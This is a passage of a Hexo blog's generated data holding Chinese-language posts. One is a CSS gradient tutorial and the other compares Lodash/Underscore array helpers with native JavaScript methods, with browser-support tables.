class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>效果图 <img src=\"/images/gradient/渐变2.png\" alt=\"效果图\"></p>\n<h4 id=\"3-重复的线性渐变\"><a href=\"#3-重复的线性渐变\" class=\"headerlink\" title=\"3. 重复的线性渐变\"></a>3. 重复的线性渐变</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-repeating-linear-gradient</span>(red, yellow 10%, green 20%);  </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-repeating-linear-gradient</span>(red, yellow 10%, green 20%);       </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-repeating-linear-gradient</span>(red, yellow 10%, green 20%);  </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">repeating-linear-gradient</span>(red, yellow 10%, green 20%);    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>效果图 <img src=\"/images/gradient/渐变3.png\" alt=\"效果图\"></p>\n<h4 id=\"4-线性渐变进阶\"><a href=\"#4-线性渐变进阶\" class=\"headerlink\" title=\"4. 线性渐变进阶\"></a>4. 线性渐变进阶</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-linear-gradient</span>(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-linear-gradient</span>(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-linear-gradient</span>(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">linear-gradient</span>(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>效果图 <img src=\"/images/gradient/0deg.png\" alt=\"效果图\"></p>\n<p>没错，就是通过角度来空值渐变的起始位置：</p>\n<ul>\n<li>45deg 效果图 <img src=\"/images/gradient/45deg.png\" alt=\"效果图\"></li>\n<li>90deg 效果图 <img src=\"/images/gradient/90deg.png\" alt=\"效果图\"></li>\n<li>135deg 效果图 <img src=\"/images/gradient/135deg.png\" alt=\"效果图\"></li>\n</ul>\n<p><em>由此，我们知道了起始可以通过角度来获得我们想要的线性渐变的各种效果了，这基本能满足我们大多数的需求了。</em><br>径向渐变</p>\n<ul>\n<li><code>background: radial-gradient(center, shape size, start-color, ..., last-color);</code></li>\n</ul>\n<ol>\n<li>径向渐变由它的中心定义。</li>\n<li>为了创建一个径向渐变，你也必须至少定义两种颜色结点。颜色结点即你想要呈现平稳过渡的颜色。同时，你也可以指定渐变的中心、形状（原型或椭圆形）、大小。默认情况下，渐变的中心是 center（表示在中心点），渐变的形状是 ellipse（表示椭圆形），渐变的大小是 farthest-corner（表示到最远的角落）。<h4 id=\"1-普通的径向渐变\"><a href=\"#1-普通的径向渐变\" class=\"headerlink\" title=\"1. 普通的径向渐变\"></a>1. 普通的径向渐变</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-radial-gradient</span>(red, green, blue);  </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-radial-gradient</span>(red, green, blue);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-radial-gradient</span>(red, green, blue);  </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">radial-gradient</span>(red, green, blue);    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li><p>效果图 <img src=\"/images/gradient/径向渐变1.png\" alt=\"效果图\"></p>\n<h4 id=\"2-不均匀的径向渐变\"><a href=\"#2-不均匀的径向渐变\" class=\"headerlink\" title=\"2. 不均匀的径向渐变\"></a>2. 不均匀的径向渐变</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-radial-gradient</span>(red 5%, green 15%, blue 60%);     </span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-radial-gradient</span>(red 5%, green 15%, blue 60%);</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-radial-gradient</span>(red 5%, green 15%, blue 60%);     </span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">radial-gradient</span>(red 5%, green 15%, blue 60%);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>效果图 <img src=\"/images/gradient/径向渐变2.png\" alt=\"效果图\"><br><strong>径向渐变容器如果不为正方形，则渐变区域会默认呈现为椭圆，若为正方形，则会呈现为正方形。</strong></p>\n<h4 id=\"3-不同尺寸的径向渐变\"><a href=\"#3-不同尺寸的径向渐变\" class=\"headerlink\" title=\"3.不同尺寸的径向渐变\"></a>3.不同尺寸的径向渐变</h4></li>\n<li>closest-side</li>\n<li>farthest-side</li>\n<li>closest-corner</li>\n<li><p>farthest-corner</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-radial-gradient</span>(70% 50%, closest-side,red,green,blue);     </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-radial-gradient</span>(70% 50%, closest-side,red,green,blue);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-radial-gradient</span>(70% 50%, closest-side,red,green,blue);     </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">radial-gradient</span>(70% 50%, closest-side,red,green,blue);       </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>效果图 <img src=\"/images/gradient/径向渐变3.png\" alt=\"效果图\"></p>\n</li>\n</ul>\n<ol>\n<li>从上面的效果图中可以看出径向渐变的渐变原点的作用</li>\n<li>通过设置尺寸属性可以改变其大小<h4 id=\"4-重复的径向渐变\"><a href=\"#4-重复的径向渐变\" class=\"headerlink\" title=\"4.重复的径向渐变\"></a>4.重复的径向渐变</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-repeating-radial-gradient</span>(red, yellow 10%, green 15%);  </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-repeating-radial-gradient</span>(red, yellow 10%, green 15%);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-repeating-radial-gradient</span>(red, yellow 10%, green 15%);  </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">repeating-radial-gradient</span>(red, yellow 10%, green 15%);    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li>效果图 <img src=\"/images/gradient/径向渐变4.png\" alt=\"效果图\"></li>\n</ul>\n"},{"id":"0809020","title":"总结《You-Dont-Need-Lodash-Underscore》","date":"2018-01-21T10:07:48.000Z","_content":"\n#### <a id=\"You-Dont-Need-Lodash-Underscore\">前言</a>\n- [Lodash](https://github.com/lodash/lodash) 和 [Underscore](https://github.com/jashkenas/underscore) 是非常优秀的现代JavaScript程序库，它们被前端开发人员广泛使用。\n\n- 但是，如果你将目标锁定为现代浏览器，则可能会发现很多原生的方法，已经被原生的 `ES5` 或者 `ES6` 支持了。\n\n- 如果你希望你的项目需要更少的依赖关系，并且你清楚地知道你的目标浏览器，那么你可能不需要 `Lodash` / `Underscore`。\n\n- 如果你想在更传统的JavaScript执行环境（浏览器？）中使用这些ES5方法，可以使用 [es5-shim](https://github.com/es-shims/es5-shim)\n\n<a href=\"#array\">1. 数组 Array</a>\n<a href=\"#Collection\">2. 集合 Collection</a>\n<a href=\"#Function\">3. 函数 Function</a>\n<a href=\"#Object\">4. 对象 Object</a>\n<a href=\"#String\">5. 字符串 String</a>\n\n#### <a name=\"Array\">1、数组 Array</a>\n\n<span style=\"color: #f55; font-size: 16px;\">* _.compact</span>\n返回一个过滤了 `falsy `（隐含有false属性，`false`, `0`, `\"\"`, `null`, `undefined`, `NaN`）的值得集合。\n```js\n// Underscore/Lodash\n_.compact([0, 1, false, 2, '', 3]);\n\n// Native\n[0, 1, false, 2, '', 3].filter(v => v)\n// [1, 2, 3]\n```\n| ![Chrome](/images/browser/chrome.png) | ![Firefox](/images/browser/firefox.png) | ![IE](/images/browser/ie.png) | ![Opera](/images/browser/opera.png) | ![Safari](/images/browser/safari.png) |\n| :---: | :---: |:---: | :---: | :---: | \n| <i style=\"color: #0b0\">√</i> |  <i style=\"color: #0b0\">1.5 √</i> | <i style=\"color: #0b0\">9 √</i> |  <i style=\"color: #0b0\">√</i> |  <i style=\"color: #0b0\">√</i>  |\n\n<span style=\"color: #f55; font-size: 16px;\">* _.concat</span>\n将任意的数组或一个值合并成一个新的数组\n```js\n// Underscore/Lodash\nvar array = [1]\nvar other = _.concat(array, 2, [3], [[4]])\nconsole.log(other)  // [1, 2, 3, [4]]\n\n// Native\nvar array = [1]\nvar other = array.concat(2, [3], [[4]])\nconsole.log(other)  // [1, 2, 3, [4]]\n```\n| ![Chrome](/images/browser/chrome.png) | ![Firefox](/images/browser/firefox.png) | ![IE](/images/browser/ie.png) | ![Opera](/images/browser/opera.png) | ![Safari](/images/browser/safari.png) |\n| :---: | :---: |:---: | :---: | :---: | \n| <i style=\"color: #0b0\">1.0 √</i> |  <i style=\"color: #0b0\">1.0 √</i> | <i style=\"color: #0b0\">5.5 √</i> |  <i style=\"color: #0b0\">√</i> |  <i style=\"color: #0b0\">√</i>  |\n\n<span style=\"color: #f55; font-size: 16px;\">* _.fill</span>\n使用从开始到结束，但不包括结束的值填充数组元素\n```js\n// Underscore/Lodash\nvar array = [1, 2, 3]\n_.fill(array, 'a')\nconsole.log(array)    \n// output: ['a', 'a', 'a']\n_.fill(Array(3), 2)\n// output: [2, 2, 2]\n_.fill([4, 6, 8, 10], '*', 1, 3)\n// output: [4, '*', '*', 10]\n\n// Native\nvar array = [1, 2, 3]\narray.fill('a')\nconsole.log(array)\n// output: ['a', 'a', 'a']\nArray(3).fill(2)\n// output: [2, 2, 2]\n[4, 6, 8, 10].fill('*', 1, 3)\n// output: [4, '*', '*', 10]\n```\n| ![Chrome](/images/browser/chrome.png) | ![Firefox](/images/browser/firefox.png) | ![IE](/images/browser/ie.png) | ![Opera](/images/browser/opera.png) | ![Safari](/images/browser/safari.png) |\n| :---: | :---: |:---: | :---: | :---: | \n| <i style=\"color: #0b0\">45.0 √</i> |  <i style=\"color: #0b0\">31.0 √</i> | <i style=\"color: #0b0\">×</i> |  <i style=\"color: #0b0\">×</i> |  <i style=\"color: #0b0\">7.1 √</i>  |\n\n<span style=\"color: #f55; font-size: 16px;\">* _.find</span>\n返回数组中满足提供的检测函数的第一个元素的值，否则返回 undefined\n```js\n// Underscore/Lodash\nvar users = [\n  { 'user': 'barney',  'age': 36, 'active': true },\n  { 'user': 'fred',    'age': 40, 'active': false },\n  { 'user': 'pebbles', 'age': 1,  'active': true }\n]\n_.find(users, function (o) { return o.age < 40; })\n// output: {user: \"barney\", age: 36, active: true}\n\n// Native\nvar users = [\n  { 'user': 'barney',  'age': 36, 'active': true },\n  { 'user': 'fred',    'age': 40, 'active': false },\n  { 'user': 'pebbles', 'age': 1,  'active': true }\n]\nusers.find(function (o) { return o.age < 40; })\n// output: {user: \"barney\", age: 36, active: true}\n```\n| ![Chrome](/images/browser/chrome.png) | ![Firefox](/images/browser/firefox.png) | ![IE](/images/browser/ie.png) | ![Opera](/images/browser/opera.png) | ![Safari](/images/browser/safari.png) |\n| :---: | :---: |:---: | :---: | :---: | \n| <i style=\"color: #0b0\">45.0 √</i> |  <i style=\"color: #0b0\">25.0 √</i> | <i style=\"color: #0b0\">×</i> |  <i style=\"color: #0b0\">×</i> |  <i style=\"color: #0b0\">7.1 √</i>  |\n\n\n#### <a name=\"Collection\">2、集合 Collection</a>\n#### <a name=\"Function\">3、函数 Function</a>\n#### <a name=\"Object\">4、对象 Object</a>\n#### <a name=\"String\">5、字符串 String</a>\n\n","source":"_posts/0809020_总结 You-Dont-Need-Lodash-Underscore.md","raw":"---\nid: 0809020\ntitle: 总结《You-Dont-Need-Lodash-Underscore》\ndate: 2018-01-21 18:07:48\ntags:\n  - JavaScript\n  - es6\ncategories:\n---\n\n#### <a id=\"You-Dont-Need-Lodash-Underscore\">前言</a>\n- [Lodash](https://github.com/lodash/lodash) 和 [Underscore](https://github.com/jashkenas/underscore) 是非常优秀的现代JavaScript程序库，它们被前端开发人员广泛使用。\n\n- 但是，如果你将目标锁定为现代浏览器，则可能会发现很多原生的方法，已经被原生的 `ES5` 或者 `ES6` 支持了。\n\n- 如果你希望你的项目需要更少的依赖关系，并且你清楚地知道你的目标浏览器，那么你可能不需要 `Lodash` / `Underscore`。\n\n- 如果你想在更传统的JavaScript执行环境（浏览器？）中使用这些ES5方法，可以使用 [es5-shim](https://github.com/es-shims/es5-shim)\n\n<a href=\"#array\">1. 数组 Array</a>\n<a href=\"#Collection\">2. 集合 Collection</a>\n<a href=\"#Function\">3. 函数 Function</a>\n<a href=\"#Object\">4. 对象 Object</a>\n<a href=\"#String\">5. 字符串 String</a>\n\n#### <a name=\"Array\">1、数组 Array</a>\n\n<span style=\"color: #f55; font-size: 16px;\">* _.compact</span>\n返回一个过滤了 `falsy `（隐含有false属性，`false`, `0`, `\"\"`, `null`, `undefined`, `NaN`）的值得集合。\n```js\n// Underscore/Lodash\n_.compact([0, 1, false, 2, '', 3]);\n\n// Native\n[0, 1, false, 2, '', 3].filter(v => v)\n// [1, 2, 3]\n```\n| ![Chrome](/images/browser/chrome.png) | ![Firefox](/images/browser/firefox.png) | ![IE](/images/browser/ie.png) | ![Opera](/images/browser/opera.png) | ![Safari](/images/browser/safari.png) |\n| :---: | :---: |:---: | :---: | :---: | \n| <i style=\"color: #0b0\">√</i> |  <i style=\"color: #0b0\">1.5 √</i> | <i style=\"color: #0b0\">9 √</i> |  <i style=\"color: #0b0\">√</i> |  <i style=\"color: #0b0\">√</i>  |\n\n<span style=\"color: #f55; font-size: 16px;\">* _.concat</span>\n将任意的数组或一个值合并成一个新的数组\n```js\n// Underscore/Lodash\nvar array = [1]\nvar other = _.concat(array, 2, [3], [[4]])\nconsole.log(other)  // [1, 2, 3, [4]]\n\n// Native\nvar array = [1]\nvar other = array.concat(2, [3], [[4]])\nconsole.log(other)  // [1, 2, 3, [4]]\n```\n| ![Chrome](/images/browser/chrome.png) | ![Firefox](/images/browser/firefox.png) | ![IE](/images/browser/ie.png) | ![Opera](/images/browser/opera.png) | ![Safari](/images/browser/safari.png) |\n| :---: | :---: |:---: | :---: | :---: | \n| <i style=\"color: #0b0\">1.0 √</i> |  <i style=\"color: #0b0\">1.0 √</i> | <i style=\"color: #0b0\">5.5 √</i> |  <i style=\"color: #0b0\">√</i> |  <i style=\"color: #0b0\">√</i>  |\n\n<span style=\"color: #f55; font-size: 16px;\">* _.fill</span>\n使用从开始到结束，但不包括结束的值填充数组元素\n```js\n// Underscore/Lodash\nvar array = [1, 2, 3]\n_.fill(array, 'a')\nconsole.log(array)    \n// output: ['a', 'a', 'a']\n_.fill(Array(3), 2)\n// output: [2, 2, 2]\n_.fill([4, 6, 8, 10], '*', 1, 3)\n// output: [4, '*', '*', 10]\n\n// Native\nvar array = [1, 2, 3]\narray.fill('a')\nconsole.log(array)\n// output: ['a', 'a', 'a']\nArray(3).fill(2)\n// output: [2, 2, 2]\n[4, 6, 8, 10].fill('*', 1, 3)\n// output: [4, '*', '*', 10]\n```\n| ![Chrome](/images/browser/chrome.png) | ![Firefox](/images/browser/firefox.png) | ![IE](/images/browser/ie.png) | ![Opera](/images/browser/opera.png) | ![Safari](/images/browser/safari.png) |\n| :---: | :---: |:---: | :---: | :---: | \n| <i style=\"color: #0b0\">45.0 √</i> |  <i style=\"color: #0b0\">31.0 √</i> | <i style=\"color: #0b0\">×</i> |  <i style=\"color: #0b0\">×</i> |  <i style=\"color: #0b0\">7.1 √</i>  |\n\n<span style=\"color: #f55; font-size: 16px;\">* _.find</span>\n返回数组中满足提供的检测函数的第一个元素的值，否则返回 undefined\n```js\n// Underscore/Lodash\nvar users = [\n  { 'user': 'barney',  'age': 36, 'active': true },\n  { 'user': 'fred',    'age': 40, 'active': false },\n  { 'user': 'pebbles', 'age': 1,  'active': true }\n]\n_.find(users, function (o) { return o.age < 40; })\n// output: {user: \"barney\", age: 36, active: true}\n\n// Native\nvar users = [\n  { 'user': 'barney',  'age': 36, 'active': true },\n  { 'user': 'fred',    'age': 40, 'active': false },\n  { 'user': 'pebbles', 'age': 1,  'active': true }\n]\nusers.find(function (o) { return o.age < 40; })\n// output: {user: \"barney\", age: 36, active: true}\n```\n| ![Chrome](/images/browser/chrome.png) | ![Firefox](/images/browser/firefox.png) | ![IE](/images/browser/ie.png) | ![Opera](/images/browser/opera.png) | ![Safari](/images/browser/safari.png) |\n| :---: | :---: |:---: | :---: | :---: | \n| <i style=\"color: #0b0\">45.0 √</i> |  <i style=\"color: #0b0\">25.0 √</i> | <i style=\"color: #0b0\">×</i> |  <i style=\"color: #0b0\">×</i> |  <i style=\"color: #0b0\">7.1 √</i>  |\n\n\n#### <a name=\"Collection\">2、集合 Collection</a>\n#### <a name=\"Function\">3、函数 Function</a>\n#### <a name=\"Object\">4、对象 Object</a>\n#### <a name=\"String\">5、字符串 String</a>\n\n","slug":"0809020_总结 You-Dont-Need-Lodash-Underscore","published":1,"updated":"2018-03-26T12:20:04.608Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvvp0029s4c02cstqt7a","content":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a><a id=\"You-Dont-Need-Lodash-Underscore\">前言</a></h4><ul>\n<li><p><a href=\"https://github.com/lodash/lodash\" target=\"_blank\" rel=\"noopener\">Lodash</a> 和 <a href=\"https://github.com/jashkenas/underscore\" target=\"_blank\" rel=\"noopener\">Underscore</a> 是非常优秀的现代JavaScript程序库，它们被前端开发人员广泛使用。</p>\n</li>\n<li><p>但是，如果你将目标锁定为现代浏览器，则可能会发现很多原生的方法，已经被原生的 <code>ES5</code> 或者 <code>ES6</code> 支持了。</p>\n</li>\n<li><p>如果你希望你的项目需要更少的依赖关系，并且你清楚地知道你的目标浏览器，那么你可能不需要 <code>Lodash</code> / <code>Underscore</code>。</p>\n</li>\n<li><p>如果你想在更传统的JavaScript执行环境（浏览器？）中使用这些ES5方法，可以使用 <a href=\"https://github.com/es-shims/es5-shim\" target=\"_blank\" rel=\"noopener\">es5-shim</a></p>\n</li>\n</ul>\n<p><a href=\"#array\">1. 数组 Array</a><br><a href=\"#Collection\">2. 集合 Collection</a><br><a href=\"#Function\">3. 函数 Function</a><br><a href=\"#Object\">4. 对象 Object</a><br><a href=\"#String\">5. 字符串 String</a></p>\n<h4 id=\"1、数组-Array\"><a href=\"#1、数组-Array\" class=\"headerlink\" title=\"1、数组 Array\"></a><a name=\"Array\">1、数组 Array</a></h4><p><span style=\"color: #f55; font-size: 16px;\">* _.compact</span><br>返回一个过滤了 <code>falsy</code>（隐含有false属性，<code>false</code>, <code>0</code>, <code>&quot;&quot;</code>, <code>null</code>, <code>undefined</code>, <code>NaN</code>）的值得集合。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Underscore/Lodash</span></span><br><span class=\"line\">_.compact([<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"literal\">false</span>, <span class=\"number\">2</span>, <span class=\"string\">''</span>, <span class=\"number\">3</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Native</span></span><br><span class=\"line\">[<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"literal\">false</span>, <span class=\"number\">2</span>, <span class=\"string\">''</span>, <span class=\"number\">3</span>].filter(<span class=\"function\"><span class=\"params\">v</span> =&gt;</span> v)</span><br><span class=\"line\"><span class=\"comment\">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><img src=\"/images/browser/chrome.png\" alt=\"Chrome\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/firefox.png\" alt=\"Firefox\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/ie.png\" alt=\"IE\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/opera.png\" alt=\"Opera\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/safari.png\" alt=\"Safari\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">√</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">1.5 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">9 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">√</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">√</i></td>\n</tr>\n</tbody>\n</table>\n<p><span style=\"color: #f55; font-size: 16px;\">* _.concat</span><br>将任意的数组或一个值合并成一个新的数组<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Underscore/Lodash</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> array = [<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"keyword\">var</span> other = _.concat(array, <span class=\"number\">2</span>, [<span class=\"number\">3</span>], [[<span class=\"number\">4</span>]])</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(other)  <span class=\"comment\">// [1, 2, 3, [4]]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Native</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> array = [<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"keyword\">var</span> other = array.concat(<span class=\"number\">2</span>, [<span class=\"number\">3</span>], [[<span class=\"number\">4</span>]])</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(other)  <span class=\"comment\">// [1, 2, 3, [4]]</span></span><br></pre></td></tr></table></figure></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><img src=\"/images/browser/chrome.png\" alt=\"Chrome\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/firefox.png\" alt=\"Firefox\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/ie.png\" alt=\"IE\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/opera.png\" alt=\"Opera\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/safari.png\" alt=\"Safari\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">1.0 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">1.0 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">5.5 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">√</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">√</i></td>\n</tr>\n</tbody>\n</table>\n<p><span style=\"color: #f55; font-size: 16px;\">* _.fill</span><br>使用从开始到结束，但不包括结束的值填充数组元素<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Underscore/Lodash</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> array = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\">_.fill(array, <span class=\"string\">'a'</span>)</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(array)    </span><br><span class=\"line\"><span class=\"comment\">// output: ['a', 'a', 'a']</span></span><br><span class=\"line\">_.fill(<span class=\"built_in\">Array</span>(<span class=\"number\">3</span>), <span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">// output: [2, 2, 2]</span></span><br><span class=\"line\">_.fill([<span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>], <span class=\"string\">'*'</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"comment\">// output: [4, '*', '*', 10]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Native</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> array = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\">array.fill(<span class=\"string\">'a'</span>)</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(array)</span><br><span class=\"line\"><span class=\"comment\">// output: ['a', 'a', 'a']</span></span><br><span class=\"line\"><span class=\"built_in\">Array</span>(<span class=\"number\">3</span>).fill(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">// output: [2, 2, 2]</span></span><br><span class=\"line\">[<span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>].fill(<span class=\"string\">'*'</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"comment\">// output: [4, '*', '*', 10]</span></span><br></pre></td></tr></table></figure></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><img src=\"/images/browser/chrome.png\" alt=\"Chrome\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/firefox.png\" alt=\"Firefox\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/ie.png\" alt=\"IE\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/opera.png\" alt=\"Opera\"></th>\n<th style=\"text-align:center\"><img 